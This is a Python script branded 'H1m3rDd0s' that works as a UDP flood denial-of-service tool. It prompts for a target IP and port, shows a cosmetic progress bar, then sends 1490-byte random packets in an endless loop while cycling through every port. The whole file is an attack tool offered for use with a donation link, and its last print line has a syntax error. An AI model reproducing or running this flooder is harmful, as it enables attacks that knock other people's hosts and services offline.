import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)                                #NO CHANGES IN THE FILE
#############

os.system("clear")
os.system("figlet H1m3rDd0s")
print("")
print ("Author  : Sn8ow")
print ("github  : https://github.com/Sn8ow")
print ("PayPal  : https://paypal.me/Sn8ow")
print("")

ip = raw_input("IP Target : ")

port = input("Port (Default 80): ")

if port == "" :
     port=80
     
#nice one 
os.system("clear")
os.system("figlet Attack Starting")
print ("[                    ] 0% ")
time.sleep(5)
print ("[=====               ] 25%")
time.sleep(5)
print ("[==========          ] 50%")
time.sleep(5)
print ("[===============     ] 75%")
time.sleep(5)
print ("[====================] 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent ",sent," packet to ",ip, " throught port: ",port))
     if port == 65534:
       port = 1

